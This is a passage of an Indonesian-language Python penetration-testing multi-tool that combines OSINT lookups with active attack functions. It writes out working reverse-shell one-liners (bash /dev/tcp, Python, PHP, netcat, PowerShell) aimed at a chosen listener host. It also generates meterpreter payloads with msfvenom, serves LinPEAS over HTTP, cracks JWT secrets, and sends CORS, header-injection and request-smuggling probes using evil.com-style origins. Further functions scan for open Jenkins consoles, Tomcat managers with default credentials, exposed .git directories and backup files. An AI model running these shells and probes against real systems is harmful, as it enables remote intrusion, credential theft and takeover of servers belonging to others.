        if re.match(r'^\d+\.\d+\.\d+\.\d+$', target): url = f"https://www.virustotal.com/api/v3/ip_addresses/{target}"
        elif re.match(r'^[a-fA-F0-9]{32,64}$', target): url = f"https://www.virustotal.com/api/v3/files/{target}"
        else: url = f"https://www.virustotal.com/api/v3/domains/{target}"
        r = requests.get(url, headers={"x-apikey":api_key}, timeout=15)
        if r.status_code == 200:
            stats = r.json().get('data',{}).get('attributes',{}).get('last_analysis_stats',{})
            vuln(f"Malicious: {stats.get('malicious',0)}"); warn(f"Suspicious: {stats.get('suspicious',0)}")
            ok(f"Harmless: {stats.get('harmless',0)}")
        else: err(f"{r.status_code}")
    except Exception as e: err(str(e))

def pastebin_search():
    voice("Pastebin Search...")
    query = ask("Query")
    for d in [f'site:pastebin.com "{query}"', f'site:pastebin.com/raw "{query}"',
              f'site:ghostbin.com "{query}"', f'site:hastebin.com "{query}"']:
        info(d); info(f"  https://www.google.com/search?q={d.replace(' ','+').replace('\"','%22')}")
    try:
        r = requests.get(f"https://psbdmp.ws/api/v3/search/{query}", timeout=10)
        if r.status_code == 200:
            for item in r.json().get('data',[])[:10]:
                vuln(f"{item.get('id')} - {item.get('tags','N/A')}"); info(f"  https://pastebin.com/{item.get('id')}")
    except: pass

def telegram_osint():
    voice("Telegram OSINT...")
    query = ask("Username/Channel")
    try:
        r = requests.get(f"https://t.me/{query}", timeout=10)
        if r.status_code == 200:
            ok(f"https://t.me/{query}")
            m = re.search(r'<meta property="og:title" content="([^"]+)"', r.text)
            if m: info(f"Title: {m.group(1)}")
            m = re.search(r'<meta property="og:description" content="([^"]+)"', r.text)
            if m: info(f"Desc: {m.group(1)[:300]}")
        else: err("Tidak ditemukan")
    except: pass

def reverse_shell_gen():
    voice("Reverse Shell Generator...")
    lhost = ask("LHOST"); lport = ask("LPORT (default 4444)") or "4444"
    print(f"\n{G}════════ REVERSE SHELL PAYLOADS ════════{W}")
    shells = {
        "Bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "Python3": f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'",
        "PHP": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "Netcat": f"nc -e /bin/sh {lhost} {lport}",
        "Netcat-alt": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        "PowerShell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});"}
    for name, payload in shells.items():
        info(f"[{name}]"); print(f"{G}{payload}{W}")
        RESULTS["payloads"].append({"type":"revshell","name":name,"payload":payload})
    print(f"\n{Y}LISTENER: nc -lvnp {lport}{W}")

def payload_gen():
    voice("Payload Generator (msfvenom)...")
    if not check_tool("msfvenom"): err("Install metasploit dulu."); return
    print(f"\n{B}[1]{W} Windows {B}[2]{W} Linux {B}[3]{W} Android {B}[4]{W} macOS {B}[5]{W} PHP {B}[6]{W} Python {B}[7]{W} Custom")
    mode = ask("Pilih"); lhost = ask("LHOST"); lport = ask("LPORT") or "4444"
    payloads = {'1':("windows/x64/meterpreter/reverse_tcp","payload.exe"),
        '2':("linux/x64/meterpreter/reverse_tcp","payload.elf"),
        '3':("android/meterpreter/reverse_tcp","payload.apk"),
        '4':("osx/x64/meterpreter/reverse_tcp","payload.macho"),
        '5':("php/meterpreter/reverse_tcp","payload.php"),
        '6':("python/meterpreter/reverse_tcp","payload.py")}
    if mode == '7': payload = ask("Payload"); out = ask("Output") or "payload"
    else: payload, out = payloads.get(mode, payloads['1'])
    os.system(f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -o {out}")
    ok(f"Saved: {out}")

def linpeas_downloader():
    voice("LinPEAS / WinPEAS Downloader...")
    print(f"\n{B}[1]{W} LinPEAS {B}[2]{W} WinPEAS {B}[3]{W} Both + HTTP server")
    m = ask("Pilih")
    if m in ['1','3']:
        info("Downloading LinPEAS..."); os.system("curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh")
        os.system("chmod +x linpeas.sh"); ok("linpeas.sh ready")
    if m in ['2','3']:
        info("Downloading WinPEAS..."); os.system("curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe -o winpeas.exe")
        ok("winpeas.exe ready")
    if m == '3':
        port = ask("HTTP port (default 8000)") or "8000"
        info(f"Target: http://<LHOST>:{port}/linpeas.sh"); os.system(f"python3 -m http.server {port}")

def stego_tool():
    voice("Steganography Tool...")
    if not check_tool("steghide") and not check_tool("exiftool"):
        warn("Install: apt install steghide exiftool binwalk")
        if ask("Install? (y/n)").lower() == 'y': os.system("sudo apt install steghide exiftool binwalk -y 2>/dev/null")
    print(f"\n{B}[1]{W} Hide {B}[2]{W} Extract {B}[3]{W} Metadata {B}[4]{W} Binwalk {B}[5]{W} Strings")
    m = ask("Pilih")
    if m == '1':
        img = ask("Image path"); data = ask("Data file path"); pw = ask("Password (opsional)")
        if pw: os.system(f"steghide embed -cf {img} -ef {data} -p {pw}")
        else: os.system(f"steghide embed -cf {img} -ef {data}")
    elif m == '2':
        img = ask("Image path"); pw = ask("Password (opsional)")
        if pw: os.system(f"steghide extract -sf {img} -p {pw}")
        else: os.system(f"steghide extract -sf {img}")
    elif m == '3': os.system(f"exiftool {ask('Image path')}")
    elif m == '4': os.system(f"binwalk {ask('Image path')}")
    elif m == '5': os.system(f"strings {ask('Image path')} | head -50")

def qr_tool():
    voice("QR Code Tool...")
    print(f"\n{B}[1]{W} Generate QR {B}[2]{W} Scan QR")
    m = ask("Pilih")
    if m == '1':
        try: import qrcode
        except:
            os.system("pip install qrcode[pil] 2>/dev/null"); import qrcode
        text = ask("Text/URL"); out = ask("Output (default: qr.png)") or "qr.png"
        qr = qrcode.QRCode(version=1, box_size=10, border=5); qr.add_data(text); qr.make(fit=True)
        qr.make_image(fill_color="black", back_color="white").save(out); ok(f"QR saved: {out}")
    elif m == '2':
        try:
            from pyzbar.pyzbar import decode
            from PIL import Image
        except:
            warn("Install: apt install libzbar0 && pip install pyzbar pillow"); return
        for d in decode(Image.open(ask("Image path"))): ok(f"{d.type}: {d.data.decode()}")

def password_gen():
    voice("Password Generator...")
    length = int(ask("Panjang (default 16)") or "16"); count = int(ask("Jumlah (default 5)") or "5")
    charset = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?"
    ok(f"Generated {count} passwords:")
    for _ in range(count): info(f"  {''.join(random.choice(charset) for _ in range(length))}")

def aes_tool():
    voice("AES Encrypt/Decrypt...")
    try: from cryptography.fernet import Fernet
    except:
        os.system("pip install cryptography 2>/dev/null"); from cryptography.fernet import Fernet
    print(f"\n{B}[1]{W} Gen key {B}[2]{W} Encrypt {B}[3]{W} Decrypt")
    m = ask("Pilih")
    if m == '1':
        key = Fernet.generate_key(); out = ask("Save key (default: secret.key)") or "secret.key"
        with open(out, 'wb') as f: f.write(key)
        ok(f"Key saved: {out}")
    elif m == '2':
        keyfile = ask("Key file") or "secret.key"; infile = ask("Input file")
        outfile = ask("Output (default: encrypted.bin)") or "encrypted.bin"
        with open(keyfile,'rb') as f: key = f.read()
        f = Fernet(key)
        with open(infile,'rb') as fi: data = fi.read()
        with open(outfile,'wb') as fo: fo.write(f.encrypt(data))
        ok(f"Encrypted: {outfile}")
    elif m == '3':
        keyfile = ask("Key file") or "secret.key"; infile = ask("Encrypted file")
        outfile = ask("Output (default: decrypted.txt)") or "decrypted.txt"
        with open(keyfile,'rb') as f: key = f.read()
        f = Fernet(key)
        with open(infile,'rb') as fi: data = fi.read()
        with open(outfile,'wb') as fo: fo.write(f.decrypt(data))
        ok(f"Decrypted: {outfile}")

def encoder_tool():
    voice("Encoder/Decoder...")
    print(f"\n{B}[1]{W} B64 enc {B}[2]{W} B64 dec {B}[3]{W} Hex enc {B}[4]{W} Hex dec")
    print(f"{B}[5]{W} URL enc {B}[6]{W} URL dec {B}[7]{W} ROT13")
    m = ask("Pilih"); text = ask("Text")
    try:
        if m == '1': ok(base64.b64encode(text.encode()).decode())
        elif m == '2': ok(base64.b64decode(text.encode()).decode())
        elif m == '3': ok(text.encode().hex())
        elif m == '4': ok(bytes.fromhex(text).decode())
        elif m == '5':
            from urllib.parse import quote as qq; ok(qq(text))
        elif m == '6':
            from urllib.parse import unquote; ok(unquote(text))
        elif m == '7':
            import codecs; ok(codecs.encode(text, 'rot_13'))
    except Exception as e: err(str(e))

def mac_lookup():
    voice("MAC / BSSID Lookup...")
    mac = ask("MAC (contoh: AA:BB:CC:DD:EE:FF)").replace(':','').replace('-','').upper()
    info(f"Looking up {mac}")
    try:
        r = requests.get(f"https://api.macvendors.com/{mac[:8]}", timeout=10)
        if r.status_code == 200: ok(f"Vendor: {r.text}")
        else: warn("Unknown vendor")
    except: pass
    try:
        r = requests.get(f"https://api.mylnikov.org/geolocation/wifi?v=1.1&data=open&bssid={mac}", timeout=10)
        if r.status_code == 200:
            data = r.json()
            if data.get('result') == 200:
                info(f"Lat: {data.get('lat')}, Lon: {data.get('lon')}")
                info(f"Maps: https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}")
    except: pass

# v8
def nuclei_scanner():
    voice("Nuclei...")
    if not check_tool("nuclei"):
        warn("Nuclei belum install.")
        if ask("Install Nuclei? (y/n)").lower() == 'y':
            if is_termux(): os.system("pkg install golang -y"); os.system("go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest")
            else: os.system("sudo apt install nuclei -y 2>/dev/null || go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest")
    if not check_tool("nuclei"): err("Install manual"); return
    target = ask("URL/domain target")
    if not target.startswith('http'): target = 'https://' + target
    print(f"\n{B}[1]{W} All  {C}[2]{W} Critical+High  {C}[3]{W} Critical  {C}[4]{W} Tags")
    sev = ask("Pilih"); sev_map = {'1':'critical,high,medium,low,info','2':'critical,high','3':'critical'}
    if sev == '4': tags = ask("Tags"); cmd = f"nuclei -u {target} -tags {tags} -silent"
    else: cmd = f"nuclei -u {target} -severity {sev_map.get(sev,'critical,high')} -silent"
    info(f"Running: {cmd}"); os.system(cmd)

def exploit_scanner():
    voice("Exploit Scanner...")
    target = ask("URL target")
    if not target.startswith('http'): target = 'http://' + target
    info(f"Scanning {target}...")
    try:
        r = requests.get(target, headers=HEADERS, timeout=10)
        server = r.headers.get('Server',''); powered = r.headers.get('X-Powered-By',''); body = r.text.lower()
        tech_stack = []
        if 'apache' in server.lower(): tech_stack.append('Apache')
        if 'nginx' in server.lower(): tech_stack.append('Nginx')
        if 'php' in powered.lower(): tech_stack.append('PHP')
        if 'wp-content' in body: tech_stack.append('WordPress')
        if 'joomla' in body: tech_stack.append('Joomla')
        if 'tomcat' in server.lower(): tech_stack.append('Tomcat')
        ok("Tech Stack:")
        for t in tech_stack: info(f"  - {t}")
        for t in tech_stack:
            info(f"CVEs for {t}...")
            try:
                api = f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={t}&resultsPerPage=10"
                rr = requests.get(api, timeout=15)
                if rr.status_code == 200:
                    for v in rr.json().get('vulnerabilities',[])[:10]:
                        cve = v.get('cve',{}); cve_id = cve.get('id','N/A')
                        desc = cve.get('descriptions',[{}])[0].get('value','')[:150]
                        metrics = cve.get('metrics',{}); score = "N/A"
                        if 'cvssMetricV31' in metrics: score = metrics['cvssMetricV31'][0]['cvssData']['baseScore']
                        if score != "N/A" and float(score) >= 7.0:
                            vuln(f"{cve_id} (CVSS: {score}) {desc}"); RESULTS["cve"].append({"id":cve_id,"score":score})
            except: pass
    except Exception as e: err(str(e))

def reverse_dns():
    voice("Reverse DNS...")
    ip = ask("IP address"); info(f"Reverse DNS for {ip}")
    try:
        host, aliases, ips = socket.gethostbyaddr(ip); ok(f"Hostname: {host}"); info(f"Aliases: {aliases}")
    except Exception as e: err(f"Tidak ada PTR record: {e}")

def asn_lookup():
    voice("ASN Lookup...")
    target = ask("IP/Domain"); info(f"ASN lookup {target}")
    try:
        if not re.match(r'^\d+\.\d+\.\d+\.\d+$', target): target = socket.gethostbyname(target)
        r = requests.get(f"https://api.hackertarget.com/aslookup/?q={target}", timeout=10)
        info(f"ASN: {r.text}")
        r2 = requests.get(f"http://ip-api.com/json/{target}?fields=as,isp,org", timeout=8).json()
        for k,v in r2.items(): info(f"  {k}: {v}")
    except Exception as e: err(str(e))

def http_methods_test():
    voice("HTTP Methods Test...")
    url = ask("URL target")
    if not url.startswith('http'): url = 'http://' + url
    for m in ['GET','POST','PUT','DELETE','PATCH','OPTIONS','HEAD','TRACE','CONNECT']:
        try:
            r = requests.request(m, url, headers=HEADERS, timeout=8, allow_redirects=False)
            allow = r.headers.get('Allow',''); status = r.status_code
            if status not in [405, 501]:
                ok(f"{m}: {status}" + (f" (Allow: {allow})" if allow else ""))
                if m in ['PUT','DELETE','TRACE'] and status in [200, 201, 204]:
                    vuln(f"DANGEROUS METHOD! {m}"); RESULTS["utils"].append({"type":"http_method","method":m})
            else: err(f"{m}: {status}")
        except: pass

def cors_detailed():
    voice("CORS Detailed...")
    url = ask("URL target")
    if not url.startswith('http'): url = 'http://' + url
    for origin in ['https://evil.com','null','https://attacker.com','https://sub.target.com']:
        try:
            r = requests.get(url, headers={**HEADERS, "Origin": origin}, timeout=8)
            acao = r.headers.get('Access-Control-Allow-Origin',''); acac = r.headers.get('Access-Control-Allow-Credentials','')
            if acao == origin:
                vuln(f"Reflected: {origin}")
                if acac.lower() == 'true': vuln("CRITICAL: + Credentials!"); RESULTS["cors"].append({"origin":origin,"creds":True})
                else: RESULTS["cors"].append({"origin":origin,"creds":False})
            elif acao == '*': warn("Wildcard: *")
        except: pass

def jwt_secret_cracker():
    voice("JWT Secret Cracker...")
    token = ask("JWT token"); wl = ask("Wordlist (default: jwt_secrets.txt)") or "jwt_secrets.txt"
    if not os.path.exists(wl):
        with open(wl,'w') as f:
            for s in ['secret','password','123456','admin','jwt','key','private','supersecret',
                      'changeme','test','default','jwtsecret','rahasia','indonesia']: f.write(s+'\n')
    try:
        parts = token.split('.')
        if len(parts) != 3: err("JWT invalid"); return
        header_b64, payload_b64, sig = parts
        msg = f"{header_b64}.{payload_b64}".encode()
        sig_bytes = base64.urlsafe_b64decode(sig + '=' * (-len(sig) % 4))
        info("Trying secrets...")
        with open(wl,'r') as f:
            for i, secret in enumerate(f, 1):
                secret = secret.strip()
                if not secret: continue
                computed = hmac.new(secret.encode(), msg, hashlib.sha256).digest()
                if computed == sig_bytes:
                    ok(f"SECRET FOUND: {secret}"); RESULTS["jwt"].append({"token":token[:50],"secret":secret}); return
        err("Tidak ketemu.")
    except Exception as e: err(str(e))

def graphql_deep_scan():
    voice("GraphQL Deep...")
    url = ask("URL GraphQL endpoint")
    if not url.startswith('http'): url = 'http://' + url
    queries = [("Full Schema", "{__schema{types{name kind fields{name type{name}}}}}"),
        ("All Queries", "{__schema{queryType{fields{name args{name type{name}}}}}}"),
        ("All Mutations", "{__schema{mutationType{fields{name}}}}")]
    for name, q in queries:
        try:
            r = requests.post(url, json={"query":q}, headers=HEADERS, timeout=10)
            if r.status_code == 200 and '__schema' in r.text:
                vuln(f"{name} EXPOSED")
                types = re.findall(r'"name":"([^"]+)"', r.text)
                if types:
                    for t in list(set(types))[:15]: info(f"  - {t}")
                RESULTS["graphql"].append({"query":name,"types":list(set(types))[:50]})
                break
        except: pass

def rate_limit_test():
    voice("Rate Limit Test...")
    url = ask("URL target")
    if not url.startswith('http'): url = 'http://' + url
    info("Sending 20 rapid requests...")
    codes = {}; start = time.time()
    for i in range(20):
        try:
            r = requests.get(url, headers=HEADERS, timeout=5); codes[r.status_code] = codes.get(r.status_code, 0) + 1
        except: codes['error'] = codes.get('error', 0) + 1
    elapsed = time.time() - start
    ok(f"Time: {elapsed:.2f}s ({20/elapsed:.1f} req/s)")
    for c, n in codes.items():
        if c == 429: vuln(f"Rate limited ({n} hits)")
        else: info(f"Status {c}: {n}")

def request_smuggling_test():
    voice("HTTP Request Smuggling...")
    url = ask("URL target")
    if not url.startswith('http'): url = 'https://' + url
    for name, h in [("CL.TE", {'Content-Length':'6','Transfer-Encoding':'chunked'}),
        ("TE.CL", {'Transfer-Encoding':'chunked','Content-Length':'3'}),
        ("TE obfuscated", {'Transfer-Encoding':'xchunked'}),
        ("TE space", {'Transfer-Encoding':' chunked'})]:
        try:
            r = requests.post(url, headers={**HEADERS,**h}, data="0\r\n\r\n", timeout=8)
            info(f"{name}: {r.status_code} ({len(r.text)} bytes)")
            if r.status_code in [200,400,500] and name == "CL.TE": warn("Possible smuggling!")
        except Exception as e: err(f"{name}: {e}")

def spring_boot_scanner():
    voice("Spring Boot Actuator...")
    url = ask("URL target")
    if not url.startswith('http'): url = 'http://' + url
    endpoints = ['/actuator','/actuator/health','/actuator/env','/actuator/beans',
                 '/actuator/mappings','/actuator/heapdump','/actuator/threaddump',
                 '/actuator/loggers','/actuator/configprops','/actuator/metrics','/actuator/prometheus']
    for ep in endpoints:
        try:
            r = requests.get(url + ep, headers=HEADERS, timeout=8)
            if r.status_code == 200:
                if len(r.text) > 100:
                    vuln(f"{ep} ({len(r.text)} bytes)")
                    if 'env' in ep or 'heapdump' in ep: vuln("SENSITIVE ENDPOINT!")
                    RESULTS["post_exploit"].append({"endpoint":ep,"data":r.text[:1000]})
                else: ok(f"{ep} (200)")
            elif r.status_code in [401,403]: warn(f"{ep} ({r.status_code})")
        except: pass

def jenkins_scanner():
    voice("Jenkins Scanner...")
    url = ask("Jenkins URL (contoh: http://host:8080)")
    if not url.startswith('http'): url = 'http://' + url
    for ep in ['/','/script','/manage','/api/json','/computer/(master)/script','/jnlpJars/jenkins-cli.jar','/whoAmI/api/json','/cli']:
        try:
            r = requests.get(url + ep, headers=HEADERS, timeout=8)
            if r.status_code == 200:
                if 'jenkins' in r.text.lower() or 'hudson' in r.text.lower():
                    vuln(f"Jenkins: {ep}")
                    if 'script' in ep: vuln("SCRIPT CONSOLE OPEN! RCE!"); RESULTS["post_exploit"].append({"type":"jenkins_rce","endpoint":ep})
                else: ok(f"{ep} (200)")
        except: pass

def tomcat_scanner():
    voice("Tomcat Scanner...")
    url = ask("Tomcat URL")
    if not url.startswith('http'): url = 'http://' + url
    for ep in ['/manager/html','/manager/status','/host-manager/html','/docs/','/examples/','/ROOT/','/admin/']:
        try:
            r = requests.get(url + ep, headers=HEADERS, timeout=8)
            if r.status_code == 200:
                vuln(f"{ep} (200)")
                if 'manager' in ep: vuln("MANAGER ACCESSIBLE! admin:admin / tomcat:tomcat"); RESULTS["admin_panels"].append(url + ep)
            elif r.status_code == 401: warn(f"{ep} (401)")
        except: pass

def git_exposure():
    voice("Git Exposure...")
    url = ask("URL target")
    if not url.startswith('http'): url = 'http://' + url
    for p in ['/.git/HEAD','/.git/config','/.git/index','/.git/logs/HEAD','/.git/refs/heads/master','/.git/refs/heads/main','/.svn/entries','/.hg/store','/.bzr/README']:
        try:
            r = requests.get(url + p, headers=HEADERS, timeout=5)
            if r.status_code == 200 and len(r.text) > 5:
                vuln(f"{p} ({len(r.text)} bytes)"); info(f"  {r.text[:150]}")
                RESULTS["leaked_env"].append({"path":p,"content":r.text[:500]})
        except: pass
    if any(r.get('path','').startswith('/.git') for r in RESULTS.get("leaked_env",[])):
        info("Git exposed! Dump with:"); info(f"  git-dumper {url}/.git ./gitdump")

def backup_finder():
    voice("Backup Finder...")
    url = ask("URL target")
    if not url.startswith('http'): url = 'http://' + url
    exts = ['.bak','.backup','.old','.orig','.save','.swp','.tmp','.copy','~','.zip','.tar.gz','.sql']
    files = ['index','admin','config','db','database','backup','www','web','wp-config','settings','password','users','.env','.htaccess']
    total = 0
    for f in files:
        for e in exts:
            p = f"/{f}{e}"
            try:
                r = requests.get(url + p, headers=HEADERS, timeout=4, allow_redirects=False)
                if r.status_code == 200 and len(r.text) > 10:
                    vuln(f"{p} ({len(r.text)} bytes)"); RESULTS["leaked_env"].append({"path":p,"content":r.text[:200]}); total += 1
            except: pass
    ok(f"Total {total} backup files found.")

def robots_parser():
    voice("robots.txt Parser...")
    url = ask("URL target")
    if not url.startswith('http'): url = 'http://' + url
    try:
        r = requests.get(urljoin(url, '/robots.txt'), headers=HEADERS, timeout=8)
        if r.status_code == 200:
            ok("robots.txt found:"); print(r.text[:2000])
            disallow = re.findall(r'Disallow:\s*(\S+)', r.text); sitemap = re.findall(r'Sitemap:\s*(\S+)', r.text)
            ok(f"Disallow ({len(disallow)}):")
            for d in disallow[:30]: info(f"  {d}")
            if sitemap:
                ok("Sitemaps:")
                for s in sitemap: info(f"  {s}")
        else: warn("robots.txt not found")
    except Exception as e: err(str(e))

def sitemap_parser():
    voice("Sitemap Parser...")
    url = ask("URL target")
    if not url.startswith('http'): url = 'http://' + url
    try:
        r = requests.get(urljoin(url, '/sitemap.xml'), headers=HEADERS, timeout=8)
        if r.status_code == 200:
            urls = re.findall(r'<loc>([^<]+)</loc>', r.text)
            ok(f"Sitemap ({len(urls)} URLs):")
            for u in urls[:50]: info(f"  {u}")
            RESULTS["utils"].append({"type":"sitemap","count":len(urls),"urls":urls[:100]})
        else: warn("sitemap.xml not found")
    except Exception as e: err(str(e))

def wordpress_plugin_enum():
    voice("WP Plugin Enum...")
    url = ask("WordPress URL")
    if not url.startswith('http'): url = 'http://' + url
    plugins = ['woocommerce','contact-form-7','yoast','jetpack','akismet','elementor','wpforms','wordfence','all-in-one-wp-migration','duplicator','ninja-forms','wp-file-manager','revslider','gravityforms','backupbuddy','easy-digital-downloads']
    for p in plugins:
        try:
            r = requests.get(urljoin(url, f'/wp-content/plugins/{p}/readme.txt'), headers=HEADERS, timeout=5)
            if r.status_code == 200:
                ver = re.search(r'Stable tag:\s*([\d.]+)', r.text); v = ver.group(1) if ver else "?"
                ok(f"{p} v{v}"); RESULTS["utils"].append({"type":"wp_plugin","name":p,"version":v})
        except: pass

def api_endpoint_discovery():
    voice("API Discovery...")
    url = ask("URL base")
    if not url.startswith('http'): url = 'http://' + url
    paths = ['/api','/api/v1','/api/v2','/api/v3','/v1','/v2','/graphql','/rest','/rest/api','/json','/xml','/rpc',
             '/api/users','/api/user','/api/admin','/api/auth','/api/login','/api/data','/api/health','/api/status',
             '/api/info','/api/config','/api/products','/api/orders','/api/customers','/api/items','/swagger.json','/openapi.json','/api-docs','/docs']
    found = 0
    for p in paths:
        try:
            r = requests.get(url + p, headers=HEADERS, timeout=5, allow_redirects=False)
            if r.status_code in [200, 201, 401, 403]:
                ct = r.headers.get('Content-Type',''); size = len(r.text)
                ok(f"{p} ({r.status_code}) [{ct.split(';')[0]}] {size}b"); found += 1
                if 'json' in ct or 'xml' in ct: vuln(f"API endpoint! {r.text[:100]}"); RESULTS["utils"].append({"type":"api","path":p})
        except: pass
    ok(f"Found {found} endpoints.")

def header_injection():
    voice("HTTP Header Injection...")
    url = ask("URL target")
    if not url.startswith('http'): url = 'http://' + url
    payloads = [("CRLF", "%0d%0aInjected-Header:%20pwned"),("X-Forwarded-Host", "evil.com"),
        ("X-Forwarded-For", "127.0.0.1"),("X-Original-URL", "/admin"),("X-Rewrite-URL", "/admin"),("X-Host", "evil.com")]
    for name, payload in payloads:
        try:
            if name == "CRLF":
                r = requests.get(url + payload, headers=HEADERS, timeout=8)
                if 'Injected-Header' in r.text or 'Injected-Header' in str(r.headers): vuln("CRLF injection!")
            else:
                r = requests.get(url, headers={**HEADERS, name: payload}, timeout=8)
                if name == "X-Forwarded-Host" and 'evil.com' in r.text[:3000]: vuln("X-Forwarded-Host reflected!")
                else: ok(f"{name}: {r.status_code}")
        except: pass

# v9
def _load_scope():
    if os.path.exists(SCOPE_FILE):
        try:
            with open(SCOPE_FILE,'r') as f: return json.load(f)
        except: return {"targets":[],"notes":[]}
    return {"targets":[],"notes":[]}
def _save_scope(s):
    with open(SCOPE_FILE,'w') as f: json.dump(s, f, indent=2)

def scope_manager():
    voice("Scope Manager...")
    while True:
        scope = _load_scope()
        print(f"\n{G}╔══════════════════════════════════════════╗{W}")
        print(f"{G}║          SCOPE MANAGER                   ║{W}")
        print(f"{G}╚══════════════════════════════════════════╝{W}")
        print(f"{B}Targets ({len(scope['targets'])}):{W}")
        for i, t in enumerate(scope['targets'], 1):
            print(f"  {G}{i}.{W} {t.get('target','')} [{t.get('type','')}] - {t.get('status','pending')}")
        print(f"\n{C}[1]{W} Add {C}[2]{W} Remove {C}[3]{W} List {C}[4]{W} Update {C}[5]{W} Note {C}[6]{W} Notes {C}[7]{W} Export {C}[8]{W} Import {C}[0]{W} Back")
        ch = ask("Pilih")
        if ch == '0': break
        elif ch == '1':
            t = ask("Target"); tp = ask("Type (web/api/ip/mobile/wifi)") or "web"
            scope['targets'].append({"target":t,"type":tp,"status":"pending","added":datetime.now().isoformat()})
            _save_scope(scope); ok("Added")
        elif ch == '2':
            idx = int(ask("Nomor")) - 1
            if 0 <= idx < len(scope['targets']): scope['targets'].pop(idx); _save_scope(scope); ok("Removed")
        elif ch == '3':
            idx = int(ask("Nomor")) - 1
            if 0 <= idx < len(scope['targets']):
                for k,v in scope['targets'][idx].items(): info(f"{k}: {v}")
        elif ch == '4':
            idx = int(ask("Nomor")) - 1
            if 0 <= idx < len(scope['targets']):
                scope['targets'][idx]['status'] = ask("Status"); _save_scope(scope); ok("Updated")
        elif ch == '5':
            scope['notes'].append({"note":ask("Note"),"time":datetime.now().isoformat()}); _save_scope(scope); ok("Saved")
        elif ch == '6':
            for n in scope['notes']: info(f"[{n['time'][:16]}] {n['note']}")
        elif ch == '7':
            name = ask("Export (default: scope_export.json)") or "scope_export.json"
            shutil.copy(SCOPE_FILE, name); ok(f"Exported: {name}")
        elif ch == '8':
            name = ask("Import file")
            if os.path.exists(name):
                with open(name,'r') as f: data = json.load(f)
                scope['targets'].extend(data.get('targets',[])); _save_scope(scope); ok("Imported")

def hunter_email_finder():
    voice("Hunter.io Email Finder...")
    api_key = ask("Hunter.io API key (kosong = browser)"); domain = ask("Domain")
    if not api_key: info(f"https://hunter.io/search/{domain}"); return
    try:
        r = requests.get(f"https://api.hunter.io/v2/domain-search?domain={domain}&api_key={api_key}", timeout=15)
        if r.status_code == 200:
            data = r.json().get('data',{}); info(f"Organization: {data.get('organization','N/A')}")
            info(f"Pattern: {data.get('pattern','N/A')}")
            for e in data.get('emails',[])[:20]:
                ok(f"{e.get('value')} ({e.get('first_name','')} {e.get('last_name','')}) - {e.get('position','')}")
                RESULTS["email_osint"].append({"email":e.get('value')})
    except Exception as e: err(str(e))

def email_verifier():
    voice("Email Verifier...")
    api_key = ask("Hunter.io API key"); email = ask("Email")
    if not api_key: warn("API key dibutuhkan"); return
    try:
        r = requests.get(f"https://api.hunter.io/v2/email-verifier?email={email}&api_key={api_key}", timeout=15)
        if r.status_code == 200:
            d = r.json().get('data',{})
            info(f"Status: {d.get('status')}"); info(f"Result: {d.get('result')}"); info(f"Score: {d.get('score')}/100")
    except Exception as e: err(str(e))

def subdomain_monitor():
    voice("Subdomain Monitor...")
    domain = ask("Domain"); save_file = f"subdomains_{domain.replace('.','_')}.json"
    words = ['www','mail','ftp','admin','dev','test','api','blog','shop','panel','cpanel','webmail','server','ns1','ns2','vpn','portal','app','staging','cdn','static','img','assets','media','docs','help','forum','store','secure','login','my','support','careers','news','events','it','vpn']
    current = []
    def check(s):
        try:
            r = requests.get(f"http://{s}.{domain}", headers=HEADERS, timeout=3, allow_redirects=False); return (s, r.status_code)
        except: return None
    with ThreadPoolExecutor(max_workers=25) as ex:
        for r in ex.map(check, words):
            if r: current.append(r[0]); ok(f"{r[0]}.{domain} ({r[1]})")
    if os.path.exists(save_file):
        with open(save_file) as f: old = json.load(f).get('subdomains',[])
        new = [s for s in current if s not in old]; gone = [s for s in old if s not in current]
        if new: vuln(f"NEW: {new}")
        if gone: warn(f"REMOVED: {gone}")
    with open(save_file,'w') as f: json.dump({"subdomains":current,"time":datetime.now().isoformat()}, f, indent=2)
    ok(f"Saved: {save_file}")

def cert_transparency():
    voice("Cert Transparency...")
    domain = ask("Domain")
    try:
        r = requests.get(f"https://crt.sh/?q=%25.{domain}&output=json", timeout=20)
        if r.status_code == 200:
            certs = r.json(); subdomains = set()
            for c in certs[:100]:
                for name in c.get('name_value','').split('\n'):
                    if name and not name.startswith('*'): subdomains.add(name.strip())
            ok(f"Found {len(subdomains)} unique subdomains:")
            for s in sorted(subdomains)[:50]: info(f"  {s}"); RESULTS["subdomains"].append(s)
    except Exception as e: err(str(e))

def censys_search():
    voice("Censys Search...")
    api_id = ask("Censys API ID (kosong = browser)"); query = ask("Query")
    if not api_id: info(f"https://search.censys.io/search?resource=hosts&q={query.replace(' ','%20')}"); return
    api_secret = ask("Censys API Secret")
    try:
        r = requests.get(f"https://search.censys.io/api/v2/hosts/search?q={query}&per_page=10", auth=(api_id, api_secret), timeout=15)
        if r.status_code == 200:
            for h in r.json().get('result',{}).get('hits',[]):
                vuln(f"{h.get('ip')}"); info(f"  Services: {[s.get('port') for s in h.get('services',[])]}")
        else: err(f"{r.status_code}")
    except Exception as e: err(str(e))

def builtwith_lookup():
    voice("BuiltWith...")
    domain = ask("Domain"); info(f"https://builtwith.com/{domain}")
    try:
        r = requests.get(f"https://builtwith.com/{domain}", headers=HEADERS, timeout=15)
        if r.status_code == 200:
            techs = re.findall(r'<h2[^>]*>([^<]+)</h2>', r.text)
            ok("Technologies:")
            for t in techs[:30]: info(f"  - {t}")
    except: pass

def urlscan_lookup():
    voice("URLScan.io...")
